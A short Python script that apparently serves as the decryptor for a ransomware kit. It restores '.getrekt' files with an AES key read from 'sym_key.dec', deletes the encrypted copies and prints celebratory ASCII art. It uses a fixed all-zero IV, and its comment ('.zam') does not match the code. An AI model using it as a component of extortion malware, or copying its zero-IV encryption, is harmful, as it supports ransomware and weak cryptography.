from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

def decrypt_file(file_path, symmetric_key):
    with open(file_path, 'rb') as file:
        ciphertext = file.read()

    cipher = Cipher(algorithms.AES(symmetric_key), modes.CFB(b'\0' * 16), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    with open(file_path[:-8], 'wb') as decrypted_file:
        decrypted_file.write(plaintext)

def main():
    # Read the decrypted symmetric key from sym_key.dec
    with open('sym_key.dec', 'rb') as sym_key_file:
        symmetric_key = sym_key_file.read()

    # Decrypt all ".zam" files
    for filename in os.listdir('.'):
        if filename.endswith('.getrekt'):
            decrypt_file(filename, symmetric_key)
            os.remove(filename)

    print(f'''
\033[0;92m________$$$$
\033[0;92m_______$$__$
\033[0;92m_______$___$$
\033[0;92m_______$___$$
\033[0;92m_______$$___$$
\033[0;92m________$____$$
\033[0;92m________$$____$$$
\033[0;92m_________$$_____$$
\033[0;92m_________$$______$$
\033[0;92m__________$_______$$
\033[0;92m____$$$$$$$________$$
\033[0;92m__$$$_______________$$$$$$
\033[0;92m_$$____$$$$____________$$$
\033[0;92m_$___$$$__$$$____________$$
\033[0;92m_$$________$$$____________$
\033[0;92m__$$____$$$$$$____________$
\033[0;92m__$$$$$$$____$$___________$
\033[0;92m__$$_______$$$$___________$
\033[0;92m___$$$$$$$$$__$$_________$$
\033[0;92m____$________$$$$_____$$$$
\033[0;92m____$$____$$$$$$____$$$$$$
\033[0;92m_____$$$$$$____$$__$$
\033[0;92m_______$_____$$$_$$$
\033[0;92m________$$$$$$$$$$
''')

    print(f'''\033[0;96mYour files have been decrypted''')

if __name__ == "__main__":
    main()
